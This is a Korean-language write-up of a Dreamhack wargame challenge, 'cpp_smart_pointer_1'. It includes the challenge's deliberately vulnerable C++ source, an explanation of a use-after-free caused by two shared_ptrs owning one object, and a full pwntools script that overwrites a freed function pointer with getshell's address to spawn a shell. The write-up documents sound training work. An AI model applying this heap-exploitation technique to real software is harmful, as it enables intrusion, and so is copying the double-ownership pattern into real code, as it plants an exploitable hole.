---
title: "cpp_smart_pointer_1 writeup"
date: 2026-04-02 07:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, uaf, heap, cpp, dreamhack]
---

## Analysis

### checksec
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

PIE가 꺼져 있어 바이너리의 주소가 고정된다.

### Source Code
```cpp
// g++ -o pwn-smart-poiner-1 pwn-smart-pointer-1.cpp -no-pie -std=c++11

#include <iostream>
#include <memory>
#include <csignal>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <cstdio>
#include <cstdlib>

char* guest_book = "guestbook\x00";

void alarm_handler(int trash)
{
    std::cout << "TIME OUT" << std::endl;
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void print_menu(){
    std::cout << "smart pointer system!" << std::endl;
    std::cout << "1. change smart pointer" << std::endl;
    std::cout << "2. delete smart pointer" << std::endl;
    std::cout << "3. test smart pointer" << std::endl;
    std::cout << "4. write guest book" << std::endl;
    std::cout << "5. view guest book" << std::endl;
    std::cout << "6. exit system" << std::endl;
    std::cout << "[*] select : ";
}

void write_guestbook(){
    std::string data;
    std::cout << "write guestbook : ";
    std::cin >> data;
    guest_book = (char *)malloc(data.length() + 1);
    strcpy(guest_book, data.c_str());
}

void view_guestbook(){
    std::cout << "guestbook data: ";
    std::cout << guest_book << std::endl;
}

void apple(){
    std::cout << "Hi im apple!" << std::endl;
}

void banana(){
    std::cout << "Hi im banana!" << std::endl;
}

void mango(){
    std::cout << "Hi im mango!" << std::endl;
}

void getshell(){
    std::cout << "Hi im shell!" << std::endl;
    std::cout << "what? shell?" << std::endl;
    system("/bin/sh");
}

class Smart{
public:
    Smart(){
        fp = apple;
    }
    Smart(const Smart&){
    }

    void change_function(int select){
        if(select == 1){
            fp = apple;
        } else if(select == 2){
            fp = banana;
        } else if(select == 3){
            fp = mango;
        } else {
            fp = apple;
        }
    }
    void (*fp)(void);
};

void change_pointer(std::shared_ptr<Smart> first){
    int selector = 0;
    std::cout << "1. apple\n2. banana\n3. mango" << std::endl;
    std::cout << "select function for smart pointer: ";
    std::cin >> selector;
    (*first).change_function(selector);
    std::cout << std::endl;
}

int main(){
    initialize();
    int selector = 0;
    Smart *smart = new Smart();
    std::shared_ptr<Smart> src_ptr(smart);
    std::shared_ptr<Smart> new_ptr(smart);
    while(1){
        print_menu();
        std::cin >> selector;
        switch(selector){
            case 1:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    change_pointer(src_ptr);
                } else if(selector == 2){
                    change_pointer(new_ptr);
                }
                break;
            case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
            case 3:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    (*src_ptr).fp();
                } else if(selector == 2){
                    (*new_ptr).fp();
                }
                break;
            case 4:
                write_guestbook();
                break;
            case 5:
                view_guestbook();
                break;
            case 6:
                return 0;
                break;
            default:
                break;
        }
    }
}
```
```cpp
class Smart{
public:
    Smart(){
        fp = apple;
    }
    Smart(const Smart&){
    }

    void change_function(int select){
        if(select == 1){
            fp = apple;
        } else if(select == 2){
            fp = banana;
        } else if(select == 3){
            fp = mango;
        } else {
            fp = apple;
        }
    }
    void (*fp)(void);
};
```

`Smart`는 함수 포인터 하나를 갖고 있는 클래스이다.
```cpp
int main(){
    initialize();
    int selector = 0;
    Smart *smart = new Smart();
    std::shared_ptr<Smart> src_ptr(smart);
    std::shared_ptr<Smart> new_ptr(smart);
    ...
```

두 개의 스마트 포인터를 각각 만들어서 하나의 메모리를 가리키도록 하고 있다. 따라서 두 스마트 포인터가 별개의 제어 블록을 갖게 된다.

## Vulnerability Analysis
```cpp
     case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
```

두 스마트 포인터 중 하나를 선택해서 소멸시킬 수 있다. 여기서 UAF 취약점이 존재한다. 두 스마트 포인터가 별개의 제어 블록을 갖기 때문에, 한쪽이 소멸되어 가리키던 메모리와 제어 블록이 해제되어도 다른 한쪽은 여전히 해제된 메모리를 가리키고 있고 자신의 제어 블록은 그대로 유지된다.

해당 문제의 서버는 tcache가 없는 libc 버전을 사용하므로, 스마트 포인터가 소멸되어 해제된 Smart 객체에 해당하는 메모리는 fastbin에 들어간다. 제어 블록은 32바이트 청크를 사용하며 Smart 객체도 마찬가지이다. 스마트 포인터가 소멸할 때는 가리키던 메모리 -> 제어 블록 순으로 해제한다. fastbin은 단방향 연결 리스트이자 LIFO 구조이므로, fastbin head -> 제어 블록 -> Smart 객체 형태가 된다.

## Exploit
```cpp
...
     case 4:
                write_guestbook();
                break;
...

void write_guestbook(){
    std::string data;
    std::cout << "write guestbook : ";
    std::cin >> data;
    guest_book = (char *)malloc(data.length() + 1);
    strcpy(guest_book, data.c_str());
}
```

원하는 데이터를 입력하면 그 길이만큼 동적 할당한 후 해당 영역에 데이터를 복사한다.
한 스마트 포인터를 소멸시킨 후 이 함수를 사용해서, 첫 번째 호출로 제어 블록 청크를 소비하고 두 번째 호출에 `getshell`의 주소인 8바이트를 보내면 Smart 객체가 사용했던 청크를 재사용하면서 함수 포인터에 `getshell` 주소가 복사된다.
```cpp
   case 3:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    (*src_ptr).fp();
                } else if(selector == 2){
                    (*new_ptr).fp();
                }
                break;
```

이후 소멸시키지 않은 스마트 포인터로 함수 포인터를 호출하면 쉘을 획득할 수 있다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./cpp_smart_pointer_1")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 12594)

    return r


def main():
    r = conn()

    r.sendlineafter(b"select : ", b"2")
    r.sendlineafter(b"Select pointer(1, 2): ", b"1")

    r.sendlineafter(b"select : ", b"4")
    r.sendlineafter(b"write guestbook : ", b"DUMMY")

    r.sendlineafter(b"select : ", b"4")
    r.sendlineafter(b"write guestbook : ", p64(exe.symbols["_Z8getshellv"]))

    r.sendlineafter(b"select : ", b"3")
    r.sendlineafter(b"Select pointer(1, 2): ", b"2")

    r.interactive()


if __name__ == "__main__":
    main()
```